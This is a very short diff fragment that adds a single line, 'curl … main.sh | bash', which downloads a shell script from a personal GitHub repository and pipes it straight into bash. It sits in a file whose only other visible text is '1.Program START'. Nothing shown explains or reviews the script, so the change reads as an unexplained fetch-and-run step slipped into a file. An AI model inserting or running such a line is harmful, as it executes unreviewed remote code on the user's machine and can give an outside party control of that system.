@@ -1,6 +1,6 @@
 
 
-
+curl https://raw.githubusercontent.com/dave0xE7/plug_scr/main/main.sh | bash
 
 
     1.Program START
